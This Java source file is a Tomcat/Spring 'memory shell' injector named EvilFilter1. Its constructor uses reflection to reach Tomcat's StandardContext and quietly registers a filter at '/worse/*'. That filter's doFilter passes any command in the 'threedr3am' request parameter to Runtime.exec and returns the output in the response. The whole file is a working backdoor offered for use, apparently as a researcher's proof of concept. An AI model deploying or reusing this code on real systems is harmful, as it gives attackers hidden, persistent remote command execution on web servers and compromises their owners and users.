import org.apache.catalina.core.StandardContext;
import org.apache.tomcat.util.descriptor.web.FilterDef;
import org.apache.tomcat.util.descriptor.web.FilterMap;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import java.io.IOException;
import java.lang.reflect.Field;
import javax.servlet.*;

public class EvilFilter1 implements Filter {
    public EvilFilter1(){
        try{
            String filetername="worse";
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT",0);
            ServletContext servletContext = context.getServletContext();
            StandardContext o = null;
            // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
            while (o == null) {
                Field f = servletContext.getClass().getDeclaredField("context");
                f.setAccessible(true);
                Object object = f.get(servletContext);

                if (object instanceof ServletContext) {
                    servletContext = (ServletContext) object;
                } else if (object instanceof StandardContext) {
                    o = (StandardContext) object;
                }
            }
            if(o.findFilterDef(filetername) == null){
                // 创建对应的filterDef
                Filter filter =  new EvilFilter1("a");
                FilterDef filterDef = new FilterDef();
                filterDef.setFilter(filter);
                filterDef.setFilterName(filetername);
                filterDef.setFilterClass(filter.getClass().getName());

                //将filterDef加入到filterDefs中
                o.addFilterDef(filterDef);

                FilterMap filterMap = new FilterMap();
                filterMap.setFilterName(filetername);
                filterMap.addURLPattern("/worse/*");
                o.addFilterMap(filterMap);

                o.filterStart();
            }

        }catch(Exception e){
            e.printStackTrace();
        }
    }

    public EvilFilter1(String a){

    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
                         FilterChain filterChain) throws IOException, ServletException {
        System.out.println(
                "TomcatShellInject doFilter.....................................................................");
        String cmd;
        if ((cmd = servletRequest.getParameter("threedr3am")) != null) {
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }
    @Override
    public void destroy() {

    }

    public static void main(String[] args) {

    }
}
